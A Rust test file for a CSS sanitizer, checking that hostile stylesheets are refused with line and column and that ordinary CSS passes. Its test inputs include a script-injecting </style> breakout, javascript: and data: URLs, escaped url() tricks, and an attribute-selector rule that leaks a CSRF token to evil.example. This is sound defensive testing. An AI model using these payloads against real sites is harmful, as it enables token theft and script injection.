//! The custom CSS boundary: every attack the brief names is refused, with the
//! line it sits on, and ordinary CSS passes unchanged.

use super::*;

fn problems(source: &str) -> Vec<CssProblem> {
    match sanitize(source) {
        Ok(_) => Vec::new(),
        Err(errors) => errors.into_iter().map(|error| error.problem).collect(),
    }
}

fn refused(source: &str, expected: &CssProblem) {
    let found = problems(source);
    assert!(
        found.contains(expected),
        "{source:?} should be refused with {expected:?}, got {found:?}"
    );
}

fn foreign(url: &str) -> CssProblem {
    CssProblem::ForeignUrl(url.to_string())
}

#[test]
fn import_is_refused_in_any_case_and_form() {
    refused(
        "@import url(https://evil.example/x.css);",
        &CssProblem::Import,
    );
    refused("@IMPORT \"/assets/css/style.css\";", &CssProblem::Import);
    refused("@im\\70 ort 'x.css';", &CssProblem::Import);
}

#[test]
fn a_url_to_another_origin_is_refused() {
    let evil = "https://evil.example/a.png";
    refused(
        &format!("body {{ background: url({evil}) }}"),
        &foreign(evil),
    );
    refused(
        "body { background: url(\"//evil.example/a.png\") }",
        &foreign("//evil.example/a.png"),
    );
    refused(
        "body { background: url('http://localhost/files/a.png') }",
        &foreign("http://localhost/files/a.png"),
    );
}

#[test]
fn data_and_script_urls_are_refused() {
    refused(
        "body { background: url(data:image/svg+xml;base64,PHN2Zz4=) }",
        &foreign("data:image/svg+xml;base64,PHN2Zz4="),
    );
    refused(
        "body { background: url('javascript:alert(1)') }",
        &foreign("javascript:alert(1)"),
    );
    // Unquoted, the parenthesis makes the token a bad URL, refused as such.
    assert!(!problems("body { background: url(javascript:alert(1)) }").is_empty());
}

#[test]
fn a_url_that_climbs_out_of_the_store_is_refused() {
    refused(
        "a { background: url(/files/../api/users) }",
        &foreign("/files/../api/users"),
    );
    refused(
        "a { background: url(/files/%2e%2e/api/users) }",
        &foreign("/files/%2e%2e/api/users"),
    );
    refused(
        "a { background: url('/files/..\\\\api') }",
        &foreign("/files/..\\api"),
    );
}

/// An escaped `url(` is the function a browser reads, so it is checked too.
#[test]
fn an_escaped_url_function_is_read_as_url() {
    refused(
        "div { background: \\75rl(\"https://evil.example/x\") }",
        &foreign("https://evil.example/x"),
    );
}

#[test]
fn url_strings_in_image_functions_are_checked() {
    refused(
        "div { background: image-set(\"https://evil.example/a.png\" 1x) }",
        &foreign("https://evil.example/a.png"),
    );
    refused(
        "div { background: src(\"https://evil.example/a.png\") }",
        &foreign("https://evil.example/a.png"),
    );
}

#[test]
fn expression_behavior_and_binding_are_refused() {
    refused(
        "div { width: expression(alert(1)) }",
        &CssProblem::Expression,
    );
    refused("div { behavior: url(/files/x.htc) }", &CssProblem::Behavior);
    refused(
        "div { b\\65havior: url(/files/x.htc) }",
        &CssProblem::Behavior,
    );
    refused(
        "div { -moz-binding: url(/files/x.xml#a) }",
        &CssProblem::MozBinding,
    );
}

#[test]
fn a_style_breakout_is_refused_wherever_it_sits() {
    refused(
        "p { color: red } </style><script>alert(1)</script>",
        &CssProblem::StyleBreakout,
    );
    refused("p { content: \"</STYLE>\" }", &CssProblem::StyleBreakout);
    refused(
        "/* </style > */ p { color: red }",
        &CssProblem::StyleBreakout,
    );
}

#[test]
fn a_font_face_from_elsewhere_is_refused() {
    refused(
        "@font-face { font-family: X; src: url(https://fonts.example/x.woff2) format(\"woff2\") }",
        &foreign("https://fonts.example/x.woff2"),
    );
}

/// The attribute selector that leaks a form value one character at a time
/// needs a request to another origin, which the URL rule refuses.
#[test]
fn attribute_selector_exfiltration_is_refused() {
    refused(
        "input[name=\"csrf\"][value^=\"a\"] { background: url(https://evil.example/?a) }",
        &foreign("https://evil.example/?a"),
    );
}

#[test]
fn document_rules_are_refused() {
    refused(
        "@-moz-document url-prefix(https://evil.example) { body { color: red } }",
        &CssProblem::Document,
    );
}

#[test]
fn oversized_css_is_refused_before_it_is_read() {
    let big = format!("/*{}*/", "x".repeat(MAX_BYTES));
    assert_eq!(problems(&big), vec![CssProblem::TooLarge(big.len())]);
}

#[test]
fn unreadable_css_is_refused() {
    refused("p { content: \"open\n }", &CssProblem::UnclosedString);
    refused("p { color: red } }", &CssProblem::StrayClose('}'));
}

/// An error names the line and column it sits on, so the editor can mark it.
#[test]
fn errors_carry_their_line_and_column() {
    let source = "a { color: red }\n\nbody {\n  background: url(https://evil.example/x.png);\n}\n@import 'x.css';";
    let errors = sanitize(source).expect_err("two refusals");
    assert_eq!(errors.len(), 2, "{errors:?}");
    assert_eq!((errors[0].line, errors[0].column), (4, 15));
    assert_eq!((errors[1].line, errors[1].column), (6, 1));
    assert_eq!(errors[1].problem, CssProblem::Import);
}

#[test]
fn ordinary_css_passes_unchanged() {
    for source in [
        ":root { --color-link: #c00; }\n.site-title a { color: red; }",
        "@font-face { font-family: Local; src: url(/files/original/font.woff2) format(\"woff2\"); }",
        ".hero { background-image: url(\"/assets/img/placeholder.svg\") }",
        "@media (min-width: 40rem) { header { padding: 2rem } }",
        "a[href^=\"http\"]::after { content: \" (external)\" }",
        "p::before { content: \"a < b\" }",
        "",
    ] {
        let css = sanitize(source).unwrap_or_else(|errors| panic!("{source:?}: {errors:?}"));
        assert_eq!(css.as_str(), source);
    }
}
